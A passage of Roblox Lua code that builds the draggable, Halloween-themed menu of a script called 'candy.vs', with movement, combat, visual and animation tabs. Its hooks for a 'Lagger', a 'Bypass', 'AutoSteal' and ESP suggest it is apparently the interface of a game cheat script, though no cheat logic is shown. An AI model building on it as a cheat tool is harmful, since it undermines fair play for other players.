	presetButton.AutoButtonColor = false
	Instance.new("UICorner", presetButton).CornerRadius = UDim.new(0, 8)
	connectBtn(presetButton, function()
	local currentIndex = 1
	for i, name in ipairs(animationPresetOrder) do
	if name == selectedAnimationPresetName then
	currentIndex = i
	break
	end
	end
	local nextIndex = currentIndex + 1
	if nextIndex > #animationPresetOrder then nextIndex = 1 end
	local nextName = animationPresetOrder[nextIndex]
	presetButton.Text = "Preset: " .. nextName
	loadAnimationPresetIntoFields(nextName)
	saveConfig()
	end)

	local fieldsContainer = Instance.new("Frame", animationsSection)
	fieldsContainer.Size = UDim2.new(1, -2, 0, 0)
	fieldsContainer.BackgroundTransparency = 1
	fieldsContainer.ClipsDescendants = false
	local fieldLayout = Instance.new("UIListLayout", fieldsContainer)
	fieldLayout.Padding = UDim.new(0, 6)
	fieldLayout.SortOrder = Enum.SortOrder.LayoutOrder
	fieldLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	fieldsContainer.Size = UDim2.new(1, -2, 0, fieldLayout.AbsoluteContentSize.Y)
	end)

	for _, key in ipairs(animationPropertyOrder) do
	local row = Instance.new("Frame", fieldsContainer)
	row.Size = UDim2.new(1, 0, 0, 30)
	row.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
	row.BackgroundTransparency = 0.25
	row.BorderSizePixel = 0
	Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)

	local label = Instance.new("TextLabel", row)
	label.Size = UDim2.new(0.48, 0, 1, 0)
	label.Position = UDim2.new(0, 8, 0, 0)
	label.BackgroundTransparency = 1
	label.Text = animationPropertyLabels[key]
	label.TextColor3 = Color3.fromRGB(220, 220, 230)
	label.TextSize = 11
	label.Font = Enum.Font.FredokaOne
	label.TextXAlignment = Enum.TextXAlignment.Left

	local input = Instance.new("TextButton", row)
	input.Size = UDim2.new(0.5, -10, 0, 20)
	input.Position = UDim2.new(0.5, 0, 0.5, -10)
	input.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
	input.BorderSizePixel = 0
	input.Text = ""
	input.TextColor3 = Color3.fromRGB(255, 255, 255)
	input.TextSize = 10
	input.Font = Enum.Font.FredokaOne
	input.AutoButtonColor = false
	Instance.new("UICorner", input).CornerRadius = UDim.new(0, 6)

	input.Activated:Connect(function()
	cycleSlotAnimation(key, input)
	end)
	animationFieldRefs[key] = input
	end

	local infoLabel = Instance.new("TextLabel", animationsSection)
	infoLabel.Size = UDim2.new(1, 0, 0, 24)
	infoLabel.BackgroundTransparency = 1
	infoLabel.Text = "Master: activa/desactiva todas. Toca una animacion para pasar a la siguiente."
	infoLabel.TextColor3 = Color3.fromRGB(140, 180, 220)
	infoLabel.TextSize = 10
	infoLabel.Font = Enum.Font.FredokaOne
	infoLabel.TextXAlignment = Enum.TextXAlignment.Left

	loadAnimationPresetIntoFields(selectedAnimationPresetName)
	if _G.__savedAnimations then
	for k, savedVal in pairs(_G.__savedAnimations) do
	if Anims[k] ~= nil then
	Anims[k] = savedVal
	local box = animationFieldRefs[k]
	if box then box.Text = animDisplayName(savedVal) end
	end
	end
	_G.__savedAnimations = nil
	end

    local toggleBtn = nil
    _G.__toggleBtn = nil
	local panelScale = Instance.new("UIScale", Panel)
	panelScale.Scale = 1

	local panelVisible = toggleStates["Toggle UI"] ~= false
	if type(_G.__CandyVSPanelVisible) == "boolean" then
	panelVisible = _G.__CandyVSPanelVisible
	end
	if toggleStates["Toggle UI"] ~= panelVisible then toggleStates["Toggle UI"] = panelVisible end
	if toggleVisualUpdaters["Toggle UI"] then toggleVisualUpdaters["Toggle UI"]() end

	local _panelAnimating = false
	local _toggleUIDebounce = false
	local miniPanel = nil
	local miniSubtitle = nil
	function setPanelVisible(show)
	show = show == true
	_G.__CandyVSPanelVisible = show
	toggleStates["Toggle UI"] = show
	if Panel.Visible == show then
	panelVisible = show
	if miniPanel then miniPanel.Visible = not show end
	if miniSubtitle then miniSubtitle.Visible = not show end
	saveConfig()
	return
	end
	if _panelAnimating or _toggleUIDebounce then return end

	_toggleUIDebounce = true
	task.delay(0.3, function() _toggleUIDebounce = false end)
	panelVisible = show
	if show then
	Panel.Visible = true
	if miniPanel then miniPanel.Visible = false end
	if miniSubtitle then miniSubtitle.Visible = false end
	panelScale.Scale = 0.92
	Panel.BackgroundTransparency = 0.2
	TweenService:Create(panelScale, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
	TweenService:Create(Panel, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.2}):Play()
	else
	_panelAnimating = true
	TweenService:Create(panelScale, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Scale = 0.9}):Play()
	TweenService:Create(Panel, TweenInfo.new(0.16, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.8}):Play()
	task.delay(0.16, function()
	Panel.Visible = false
	if miniPanel then miniPanel.Visible = true end
	if miniSubtitle then miniSubtitle.Visible = true end
	panelScale.Scale = 1
	Panel.BackgroundTransparency = 0.95
	_panelAnimating = false
	end)
	end
	if toggleVisualUpdaters["Toggle UI"] then toggleVisualUpdaters["Toggle UI"]() end
	saveConfig()
	end

	Panel.Visible = false
	_G.__setPanelVisible = setPanelVisible

	FeatureToggles["Toggle UI"] = function()
	setPanelVisible(not Panel.Visible)
	end

	savedMenuPos = _G["_CandyVS_UI_MenuPos"]
	if savedMenuPos then
	local placedMenuPos = Vector2.new(placeInsideViewport(Panel, 0, savedMenuPos.x, 0, savedMenuPos.y))
	Panel.Position = UDim2.new(0, placedMenuPos.X, 0, placedMenuPos.Y)
	else
	Panel.Position = UDim2.new(1, -PANEL_W - 20, 0.5, -PANEL_H/2)
	end

	Panel.Visible = false
	toggleStates["Toggle UI"] = panelVisible
	_G.__CandyVSPanelVisible = panelVisible
	if miniPanel then miniPanel.Visible = not panelVisible end
	if miniSubtitle then miniSubtitle.Visible = not panelVisible end

	;(function()
	_G.__CandyVSModernGuiActive = true
	local themesPanel = ScreenGui:FindFirstChild("MainThemesPanel")
	if themesPanel then themesPanel:Destroy() end

	if FPSLabel then FPSLabel.Parent = ScreenGui end
	if PingLabel then PingLabel.Parent = ScreenGui end
	for _, child in ipairs(Panel:GetChildren()) do
	if child ~= panelScale then child:Destroy() end
	end
	if panelScale then panelScale.Scale = 1 end
	if toggleBtn then toggleBtn:Destroy(); toggleBtn = nil; _G.__toggleBtn = nil end
	if miniPanel then pcall(function() miniPanel:Destroy() end); miniPanel = nil; miniSubtitle = nil end

	Panel.Name = "CandyVSModernPanel"
	local MODERN = {
	headerH = isMobile and 52 or 64,
	pageGap = isMobile and 8 or 10,
	sectionH = isMobile and 18 or 22,
	inputH = isMobile and 32 or 38,
	toggleH = isMobile and 44 or 48,
	toggleBindH = isMobile and 52 or 58,
	actionH = isMobile and 36 or 44,
	textSize = isMobile and 10 or 12,
	categoryH = isMobile and 28 or 32,
	}
	local modernViewport = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or vp
	local modernPanelW = isMobile and math.clamp(math.floor(modernViewport.X * 0.52), 210, 270) or 280
	local modernPanelH = isMobile and math.clamp(math.floor(modernViewport.Y * 0.72), 420, 560) or 580
	Panel.Size = UDim2.new(0, modernPanelW, 0, modernPanelH)
	local mainUIScale = Panel:FindFirstChild("MainUIScale")
	if not mainUIScale then
		mainUIScale = Instance.new("UIScale")
		mainUIScale.Name = "MainUIScale"
		mainUIScale.Parent = Panel
	end
	mainUIScale.Scale = math.clamp((_G.__CandyVSUIScale or 78) / 100, 0.4, 1.5)
	_G.__CandyVSMainUIScale = mainUIScale
	_G.__CandyVSSetUIScale = function(value)
		local n = tonumber(value)
		if not n or n ~= n or math.abs(n) == math.huge then
			return _G.__CandyVSUIScale or 78
		end
		n = math.clamp(math.floor(n + 0.5), 40, 150)
		_G.__CandyVSUIScale = n
		if _G.__CandyVSMainUIScale and _G.__CandyVSMainUIScale.Parent then
			_G.__CandyVSMainUIScale.Scale = n / 100
		end
		pcall(saveConfig)
		return n
	end
	local savedModernPosition = _G["_CandyVS_UI_MenuPos"]
	if savedModernPosition and savedModernPosition.x ~= nil and savedModernPosition.y ~= nil then
	Panel.Position = UDim2.new(savedModernPosition.xs or 0, savedModernPosition.x, savedModernPosition.ys or 0, savedModernPosition.y)
	else
	Panel.Position = UDim2.new(0, 6, 0, 54)
	end
	Panel.BackgroundTransparency = 1
	Panel.BorderSizePixel = 0
	Panel.ClipsDescendants = false
	Panel.Visible = panelVisible

	local C = {
	bg = Color3.fromRGB(12, 6, 4),
	bgDark = Color3.fromRGB(8, 4, 2),
	row = Color3.fromRGB(35, 14, 6),
	accent = Color3.fromRGB(255, 140, 0),
	accentDim = Color3.fromRGB(200, 80, 0),
	text = Color3.fromRGB(255, 245, 230),
	textDim = Color3.fromRGB(255, 200, 100),
	textMuted = Color3.fromRGB(180, 100, 40),
	divider = Color3.fromRGB(80, 30, 10),
	}
	local function corner(parent, radius)
	local item = Instance.new("UICorner")
	item.CornerRadius = UDim.new(0, radius or 10)
	item.Parent = parent
	return item
	end
	local function stroke(parent, color, thickness)
	local item = Instance.new("UIStroke")
	item.Color = color or C.divider
	item.Thickness = thickness or 1
	item.Parent = parent
	return item
	end
	local activeUiTweens = setmetatable({}, { __mode = "k" })
	local function tween(object, properties, duration, easingStyle, easingDirection)
	if not object or not object.Parent then return nil end
	local previous = activeUiTweens[object]
	if previous then pcall(function() previous:Cancel() end) end
	local animation = TweenService:Create(object, TweenInfo.new(
	duration or 0.16,
	easingStyle or Enum.EasingStyle.Quart,
	easingDirection or Enum.EasingDirection.Out
	), properties)
	activeUiTweens[object] = animation
	animation:Play()
	return animation
	end
	local function makeDraggable(handle, target)
	local dragging, dragInput, dragStart, startPosition = false, nil, nil, nil
	handle.Active = true
	_G.__CandyVSGuiPositionResetters[target.Name] = function()
	dragging = false
	dragInput = nil
	dragStart = nil
	startPosition = nil
	target.Position = UDim2.fromOffset(6, 54)
	if target == Panel then
	_G["_CandyVS_UI_MenuPos"] = nil
	else
	_G["_CandyVS_UI_ModernMiniPos"] = nil
	end
	end
	handle.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	if dragging then return end
	dragInput = input
	dragging = true; dragStart = input.Position; startPosition = target.Position
	input.Changed:Connect(function()
	if input.UserInputState == Enum.UserInputState.End then
	dragging = false
	if target == Panel then
	_G["_CandyVS_UI_MenuPos"] = {
	x = target.Position.X.Offset,
	y = target.Position.Y.Offset,
	xs = target.Position.X.Scale,
	ys = target.Position.Y.Scale,
	}
	pcall(saveConfig)
	elseif target.Name == "CandyVSRestoreButton" then
	_G["_CandyVS_UI_ModernMiniPos"] = {
	x = target.Position.X.Offset,
	y = target.Position.Y.Offset,
	}
	pcall(saveConfig)
	end
	end
	end)
	end
	end)
	handle.InputChanged:Connect(function(input)
	if dragging and dragInput.UserInputType ~= Enum.UserInputType.Touch and input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
	end)
	_G.__CandyVSTrackConn(UserInputService.InputChanged:Connect(function(input)
	if dragging and input == dragInput then
	local delta = input.Position - dragStart
	placeInsideViewport(target, startPosition.X.Scale, startPosition.X.Offset + delta.X, startPosition.Y.Scale, startPosition.Y.Offset + delta.Y)
	end
	end))
	end

	local inner = Instance.new("Frame")
	inner.Name = "Inner"
	inner.Size = UDim2.new(1, 0, 1, 0)
	inner.BackgroundColor3 = C.bg
	inner.BorderSizePixel = 0
	inner.Parent = Panel
	corner(inner, 28)
	local innerStroke = stroke(inner, C.accentDim, 1.5)
	innerStroke.Transparency = 0.35
	local innerGradient = Instance.new("UIGradient")
	innerGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 8, 4)),
		ColorSequenceKeypoint.new(0.52, C.bg),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 3, 2)),
	})
	innerGradient.Rotation = 90
	innerGradient.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0.12),
		NumberSequenceKeypoint.new(1, 0.04),
	})
	innerGradient.Parent = inner

	local background = Instance.new("Frame")
	background.Name = "BackgroundImage"
	background.Size = UDim2.new(1, 0, 1, 0)
	background.BackgroundColor3 = Color3.fromRGB(12, 4, 2)
	background.BackgroundTransparency = 0
	background.BorderSizePixel = 0
	background.ZIndex = 0
	background.Parent = inner
	corner(background, 28)

	local bgGradient = Instance.new("UIGradient")
	bgGradient.Rotation = 125
	bgGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(55, 10, 60)),   
		ColorSequenceKeypoint.new(0.4, Color3.fromRGB(120, 35, 8)), 
		ColorSequenceKeypoint.new(0.75, Color3.fromRGB(25, 8, 4)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 2, 2)),      
	})
	bgGradient.Parent = background

	local bgBrand = Instance.new("TextLabel")
	bgBrand.Name = "CandyVSBackgroundBrand"
	bgBrand.Size = UDim2.new(1, -20, 0, 48)
	bgBrand.Position = UDim2.new(0, 10, 0.5, -24)
	bgBrand.BackgroundTransparency = 1
	bgBrand.Text = "candy.vs"
	bgBrand.TextColor3 = Color3.fromRGB(255, 140, 0)
	bgBrand.TextTransparency = 0.78
	bgBrand.TextStrokeColor3 = Color3.fromRGB(40, 10, 0)
	bgBrand.TextStrokeTransparency = 0.6
	bgBrand.Font = Enum.Font.FredokaOne
	bgBrand.TextSize = 42
	bgBrand.TextScaled = false
	bgBrand.ZIndex = 1
	bgBrand.Parent = inner

	local bgBrand2 = Instance.new("TextLabel")
	bgBrand2.Name = "CandyVSBackgroundBrandSub"
	bgBrand2.Size = UDim2.new(1, -20, 0, 18)
	bgBrand2.Position = UDim2.new(0, 10, 0.5, 22)
	bgBrand2.BackgroundTransparency = 1
	bgBrand2.Text = "HALLOWEEN"
	bgBrand2.TextColor3 = Color3.fromRGB(255, 180, 80)
	bgBrand2.TextTransparency = 0.82
	bgBrand2.Font = Enum.Font.FredokaOne
	bgBrand2.TextSize = 14
	bgBrand2.ZIndex = 1
	bgBrand2.Parent = inner

	local vignette = Instance.new("Frame")
	vignette.Name = "HalloweenVignette"
	vignette.Size = UDim2.fromScale(1, 1)
	vignette.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	vignette.BackgroundTransparency = 0.45
	vignette.BorderSizePixel = 0
	vignette.ZIndex = 1
	vignette.Parent = inner
	corner(vignette, 28)
	local vigGrad = Instance.new("UIGradient")
	vigGrad.Rotation = 90
	vigGrad.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0.25),
		NumberSequenceKeypoint.new(0.4, 0.75),
		NumberSequenceKeypoint.new(0.6, 0.75),
		NumberSequenceKeypoint.new(1, 0.15),
	})
	vigGrad.Parent = vignette

	local GUI_THEME_IMAGES = {
		["GUI 1"] = "",
		["GUI 2"] = "",
	}
	local GUI_THEME_PANEL_BACKGROUND = { ["GUI 1"] = 1, ["GUI 2"] = 1 }
	local activeGuiTheme = "GUI 1"  
	_G.__CandyVSGuiTheme = activeGuiTheme
	local refreshCategoryTextColors
	local function syncGuiThemeToPanels(themeName)
		local backgroundIndex = GUI_THEME_PANEL_BACKGROUND[themeName] or 1
		pcall(function()
			if _G.CandyVSLagger and _G.CandyVSLagger.SetBackground then
				_G.CandyVSLagger.SetBackground(backgroundIndex)
			end
		end)
		pcall(function()
			if _G.CandyVSBypass and _G.CandyVSBypass.SetBackground then
				_G.CandyVSBypass.SetBackground(backgroundIndex)
			end
		end)
	end
	_G.__CandyVSAddUnifiedPanelShade(inner, 24, 1)
	local function applyGuiTheme(themeName)
	if not GUI_THEME_IMAGES[themeName] then themeName = "GUI 1" end
	activeGuiTheme = themeName
	_G.__CandyVSGuiTheme = themeName
	local isOrange = themeName == "GUI 2"
	local accent = isOrange and Color3.fromRGB(255, 140, 40) or Color3.fromRGB(255, 140, 0)
	local accentDim = isOrange and Color3.fromRGB(200, 90, 25) or Color3.fromRGB(200, 80, 0)
	_G.__CandyVSThemeAccent = accent
	C.accent = accent
	C.accentDim = accentDim
	C.bg = isOrange and Color3.fromRGB(18, 10, 6) or Color3.fromRGB(14, 6, 3)
	C.bgDark = isOrange and Color3.fromRGB(12, 6, 4) or Color3.fromRGB(10, 4, 2)
	C.row = isOrange and Color3.fromRGB(42, 18, 10) or Color3.fromRGB(32, 12, 5)
	C.text = isOrange and Color3.fromRGB(255, 248, 240) or Color3.fromRGB(255, 245, 230)
	C.textDim = isOrange and Color3.fromRGB(255, 195, 130) or Color3.fromRGB(255, 200, 110)
	C.textMuted = isOrange and Color3.fromRGB(210, 140, 70) or Color3.fromRGB(190, 110, 45)
	C.divider = isOrange and Color3.fromRGB(100, 45, 18) or Color3.fromRGB(70, 25, 8)
	pcall(function()
		inner.BackgroundColor3 = C.bg
		background.BackgroundColor3 = C.bg
		local outline = inner:FindFirstChild("UnifiedPanelWhiteOutline")
		if outline then outline.Color = accent end
		local softGlow = inner:FindFirstChild("UnifiedPanelWhiteGlow")
		if softGlow then softGlow.Color = isOrange and Color3.fromRGB(255, 110, 30) or Color3.fromRGB(255, 100, 20) end
		if bgBrand then bgBrand.TextColor3 = accent end
	end)
	if _G.__CandyVSApplyTheme then _G.__CandyVSApplyTheme() end
	local backgroundShade = inner:FindFirstChild("UnifiedBackgroundShade")
	if backgroundShade then backgroundShade.Visible = true end
	innerStroke.Transparency = 1
	syncGuiThemeToPanels(themeName)
	if _G.__CandyVSApplyAutoStealBarTheme then
	pcall(_G.__CandyVSApplyAutoStealBarTheme, themeName)
	end
	if _G.__CandyVSRefreshESPTheme then
	pcall(_G.__CandyVSRefreshESPTheme, accent, Color3.fromRGB(0, 0, 0))
	end
	if _G.__refreshSpeedBillboards then
	pcall(_G.__refreshSpeedBillboards)
	end
	if _G.__CandyVSRefreshQuickTheme then
	pcall(_G.__CandyVSRefreshQuickTheme)
	end
	for _, updater in pairs(toggleVisualUpdaters) do
		pcall(updater)
	end
	if refreshCategoryTextColors then refreshCategoryTextColors() end
	end
	applyGuiTheme(activeGuiTheme)

	local header = Instance.new("Frame")
	header.Name = "HeaderFrame"
	header.Size = UDim2.new(1, 0, 0, MODERN.headerH)
	header.BackgroundTransparency = 1
	header.ZIndex = 10
	header.Parent = inner
	makeDraggable(header, Panel)

	local statsPanel = Instance.new("Frame")
	statsPanel.Name = "HeaderStats"
	statsPanel.Position = UDim2.new(0, 14, 0, 8)
	statsPanel.Size = UDim2.new(0, 78, 0, 40)
	statsPanel.BackgroundColor3 = C.bgDark
	statsPanel.BackgroundTransparency = 0.35
	statsPanel.BorderSizePixel = 0
	statsPanel.ZIndex = 12
	statsPanel.Parent = header
	statsPanel.Visible = false
	corner(statsPanel, 8)
	stroke(statsPanel, Color3.fromRGB(45, 45, 45), 1)

	if FPSLabel then
	FPSLabel.Parent = statsPanel
	FPSLabel.Position = UDim2.new(0, 7, 0, 3)
	FPSLabel.Size = UDim2.new(1, -14, 0, 16)
	FPSLabel.BackgroundTransparency = 1
	FPSLabel.TextColor3 = C.text
	FPSLabel.TextSize = 9
	FPSLabel.Font = Enum.Font.FredokaOne
	FPSLabel.TextXAlignment = Enum.TextXAlignment.Left
	FPSLabel.TextTransparency = 0
	FPSLabel.Visible = false
	FPSLabel.ZIndex = 13
	end
	if PingLabel then
	PingLabel.Parent = statsPanel
	PingLabel.Position = UDim2.new(0, 7, 0, 20)
	PingLabel.Size = UDim2.new(1, -14, 0, 16)
	PingLabel.BackgroundTransparency = 1
	PingLabel.TextColor3 = C.textDim
	PingLabel.TextSize = 9
	PingLabel.Font = Enum.Font.FredokaOne
	PingLabel.TextXAlignment = Enum.TextXAlignment.Left
	PingLabel.TextTransparency = 0
	PingLabel.Visible = false
	PingLabel.ZIndex = 13
	end

	local title = Instance.new("TextLabel")
	title.Position = UDim2.new(0, 14, 0, isMobile and 6 or 8)
	title.Size = UDim2.new(1, -90, 0, isMobile and 22 or 26)
	title.BackgroundTransparency = 1
	title.Text = "candy.vs"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.TextSize = isMobile and 18 or 22
	title.Font = Enum.Font.FredokaOne
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.TextStrokeColor3 = C.accent
	title.TextStrokeTransparency = 0.4
	title.ZIndex = 11
	title.Parent = header

	local subtitle = Instance.new("TextLabel")
	subtitle.Position = UDim2.new(0, 98, 0, 32)
	subtitle.Size = UDim2.new(1, -146, 0, 14)
	subtitle.BackgroundTransparency = 1
	subtitle.Text = "HALLOWEEN"
	subtitle.TextColor3 = Color3.fromRGB(255, 140, 0)
	subtitle.TextSize = 10
	subtitle.Font = Enum.Font.FredokaOne
	subtitle.TextXAlignment = Enum.TextXAlignment.Left
	subtitle.ZIndex = 11
	subtitle.Parent = header
	subtitle.Visible = true
	subtitle.Position = UDim2.new(0, 14, 0, isMobile and 28 or 34)
	subtitle.Size = UDim2.new(1, -90, 0, 14)

	local closeButton = Instance.new("TextButton")
	closeButton.Size = UDim2.new(0, 28, 0, 28)
	closeButton.Position = UDim2.new(1, -36, 0, isMobile and 6 or 8)
	closeButton.BackgroundColor3 = C.bgDark
	closeButton.BorderSizePixel = 0
	closeButton.Text = "-"
	closeButton.TextColor3 = C.accent
	closeButton.Font = Enum.Font.FredokaOne
	closeButton.TextSize = 22
	closeButton.ZIndex = 12
	closeButton.Parent = header
	corner(closeButton, 10)
	stroke(closeButton, C.accentDim, 1)
	closeButton.MouseEnter:Connect(function()
		tween(closeButton, {BackgroundColor3 = C.accentDim, TextColor3 = C.text}, 0.12)
	end)
	closeButton.MouseLeave:Connect(function()
		tween(closeButton, {BackgroundColor3 = C.bgDark, TextColor3 = C.textMuted}, 0.12)
	end)

	local separator = Instance.new("Frame")
	separator.Position = UDim2.new(0, 14, 0, MODERN.headerH)
	separator.Size = UDim2.new(1, -28, 0, 1)
	separator.BackgroundColor3 = C.accent
	separator.BackgroundTransparency = 0.7
	separator.BorderSizePixel = 0
	separator.ZIndex = 9
	separator.Parent = inner

	local categoryPanel = Instance.new("Frame")
	categoryPanel.Name = "LeftPanel"
	categoryPanel.Size = UDim2.new(0, 72, 1, -78)
	categoryPanel.Position = UDim2.new(1, -72, 0, 68)
	categoryPanel.BackgroundColor3 = C.bgDark
	categoryPanel.BackgroundTransparency = 0.5
	categoryPanel.BorderSizePixel = 0
	categoryPanel.ZIndex = 5
	categoryPanel.Parent = inner
	corner(categoryPanel, 12)
	categoryPanel.Visible = false
	title.Text = "candy.vs"
	title.Visible = true

	local TAB_BAR_H = isMobile and 42 or 46
	local categoryList = Instance.new("Frame")
	categoryList.Name = "TopTabBar"
	categoryList.Size = UDim2.new(1, -16, 0, TAB_BAR_H)
	categoryList.Position = UDim2.new(0, 8, 0, MODERN.headerH)
	categoryList.BackgroundColor3 = Color3.fromRGB(8, 4, 2)
	categoryList.BackgroundTransparency = 0.25
	categoryList.BorderSizePixel = 0
	categoryList.ZIndex = 30
	categoryList.Parent = inner
	corner(categoryList, 12)
	local categoryLayout = Instance.new("UIListLayout", categoryList)
	categoryLayout.SortOrder = Enum.SortOrder.LayoutOrder
	categoryLayout.FillDirection = Enum.FillDirection.Horizontal
	categoryLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	categoryLayout.VerticalAlignment = Enum.VerticalAlignment.Center
	categoryLayout.Padding = UDim.new(0, isMobile and 3 or 5)
	local categoryPadding = Instance.new("UIPadding", categoryList)
	categoryPadding.PaddingLeft = UDim.new(0, 6)
	categoryPadding.PaddingRight = UDim.new(0, 6)
	categoryPadding.PaddingTop = UDim.new(0, 0)

	local content = Instance.new("Frame")
	content.Name = "ContentFrame"
	content.Size = UDim2.new(1, -16, 1, -(MODERN.headerH + TAB_BAR_H + 14))
	content.Position = UDim2.new(0, 8, 0, MODERN.headerH + TAB_BAR_H + 6)
	content.BackgroundTransparency = 1
	content.ClipsDescendants = true
	content.ZIndex = 4
	content.Parent = inner

	local function keepOriginalText(object)
	object:SetAttribute("CandyVSKeepBlackText", true)
	object.TextStrokeTransparency = 1
	return object
	end
	for _, object in ipairs(inner:GetDescendants()) do
	if object:IsA("TextLabel") or object:IsA("TextButton") or object:IsA("TextBox") then
	keepOriginalText(object)
	end
	end
	title.TextColor3 = C.text
	subtitle.TextColor3 = C.textDim
	closeButton.TextColor3 = C.textMuted
	local pageScales = {}
	local function newPage(name)
	local page = Instance.new("ScrollingFrame")
	page.Name = name .. "Page"
	page.Size = UDim2.new(1, 0, 1, 0)
	page.BackgroundTransparency = 1
	page.BorderSizePixel = 0
	page.ScrollBarThickness = 2
	page.ScrollBarImageColor3 = C.accent
	page.ScrollBarImageTransparency = 0.28
	page.ElasticBehavior = Enum.ElasticBehavior.Always
	page.ScrollingDirection = Enum.ScrollingDirection.Y
	page.AutomaticCanvasSize = Enum.AutomaticSize.Y
	page.CanvasSize = UDim2.new(0, 0, 0, 0)
	page.Visible = name == "Movement"
	page.ZIndex = 5
	page.Parent = content
	local pageScale = Instance.new("UIScale")
	pageScale.Name = "PageTransitionScale"
	pageScale.Scale = 1
	pageScale.Parent = page
	pageScales[name] = pageScale
	local layout = Instance.new("UIListLayout", page)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Padding = UDim.new(0, MODERN.pageGap)
	local padding = Instance.new("UIPadding", page)
	padding.PaddingLeft = UDim.new(0, 4)
	padding.PaddingRight = UDim.new(0, 4)
	padding.PaddingTop = UDim.new(0, isMobile and 4 or 6)
	padding.PaddingBottom = UDim.new(0, isMobile and 4 or 6)
	return page
	end
	local pages = {
	Movement = newPage("Movement"),
	Combat = newPage("Combat"),
	Visual = newPage("Visual"),
	Animations = newPage("Animations"),
	}

	local function setFeature(featureName, enabled)
	local current = toggleStates[featureName] == true
	if current == enabled then return end
	local toggler = FeatureToggles[featureName]
	if toggler then pcall(toggler) end
	if toggleStates[featureName] ~= enabled then
	toggleStates[featureName] = enabled
	local postToggle = FeaturePostToggle[featureName]
	if postToggle then pcall(postToggle, enabled) end
	end
	local updater = toggleVisualUpdaters[featureName]
	if updater then pcall(updater) end
	pcall(saveConfig)
	end
	local function beginKeybind(button, featureName)
	if listeningBindBtn then
	listeningBindBtn.Text = "-"
	end
	listeningBindBtn = button
	listeningFeature = featureName
	button.Text = "..."
	end
	local function sectionLabel(parent, text, order)
	local wrapper = Instance.new("Frame")
	wrapper.Size = UDim2.new(1, 0, 0, isMobile and 26 or 30)
	wrapper.BackgroundTransparency = 1
	wrapper.LayoutOrder = order
	wrapper.Parent = parent
	local label = keepOriginalText(Instance.new("TextLabel"))
	label.Size = UDim2.new(1, 0, 1, 0)
	label.BackgroundTransparency = 1
	label.Text = string.upper(tostring(text or ""))
	label.TextColor3 = Color3.fromRGB(255, 255, 255)
	label.TextSize = isMobile and 12 or 13
	label.Font = Enum.Font.FredokaOne
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = wrapper
	end
	local function inlineModeBind(parent, featureName, position)
	local bind = keepOriginalText(Instance.new("TextButton"))
	bind.Name = "ModeKeybind"
	bind.Size = UDim2.fromOffset(isMobile and 38 or 44, isMobile and 16 or 20)
	bind.Position = position
	bind.BackgroundColor3 = C.accentDim
	bind.BackgroundTransparency = 0.25
	bind.BorderSizePixel = 0
	bind.TextColor3 = C.text
	bind.TextSize = isMobile and 8 or 9
	bind.Font = Enum.Font.FredokaOne
	bind.Text = FeatureKeybinds[featureName] and keybindDisplayName(FeatureKeybinds[featureName]) or "-"
	bind.ZIndex = 8
	bind.Parent = parent
	corner(bind, 5); stroke(bind, Color3.fromRGB(55, 55, 60), 1)
	bind.MouseButton1Click:Connect(function()
	beginKeybind(bind, featureName)
	end)
	table.insert(_allBindBtns, bind)

	local previousUpdater = toggleVisualUpdaters[featureName]
	toggleVisualUpdaters[featureName] = function()
	if previousUpdater then pcall(previousUpdater) end
	local key = FeatureKeybinds[featureName]
	bind.Text = key and keybindDisplayName(key) or "-"
	bind.BackgroundColor3 = C.accentDim
	bind.BackgroundTransparency = 0.25
	bind.TextColor3 = C.text
	end
	return bind
	end
	local function inputRow(parent, labelText, value, order, callback, bindFeatureName)
	local row = Instance.new("Frame")
	row.Size = UDim2.new(1, 0, 0, MODERN.inputH)
	row.BackgroundColor3 = C.row
	row.BackgroundTransparency = 0.5
	row.BorderSizePixel = 0
	row.LayoutOrder = order
	row.Parent = parent
	corner(row, 14); stroke(row, C.divider, 1)
	local label = keepOriginalText(Instance.new("TextLabel"))
	label.Size = bindFeatureName and UDim2.new(1, isMobile and -116 or -142, 1, 0) or UDim2.new(0.65, 0, 1, 0)
	label.Position = UDim2.new(0, isMobile and 8 or 12, 0, 0)
	label.BackgroundTransparency = 1
	label.Text = labelText
	label.TextColor3 = C.text
	label.TextSize = MODERN.textSize
	label.Font = Enum.Font.FredokaOne
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = row
	if bindFeatureName then
	inlineModeBind(row, bindFeatureName, UDim2.new(1, isMobile and -94 or -116, 0.5, isMobile and -8 or -10))
	end
	local boxFrame = Instance.new("Frame")
	boxFrame.Size = UDim2.new(0, isMobile and 44 or 54, 0, isMobile and 18 or 22)
	boxFrame.Position = UDim2.new(1, isMobile and -51 or -64, 0.5, isMobile and -9 or -11)
	boxFrame.BackgroundColor3 = C.row
	boxFrame.BackgroundTransparency = 0.15
	boxFrame.BorderSizePixel = 0
	boxFrame.Parent = row
	corner(boxFrame, 6); stroke(boxFrame, Color3.fromRGB(55, 55, 60), 1)
	local box = keepOriginalText(Instance.new("TextBox"))
	box.Size = UDim2.new(1, 0, 1, 0)
	box.BackgroundTransparency = 1
	box.Text = tostring(value)
	box.TextColor3 = C.text
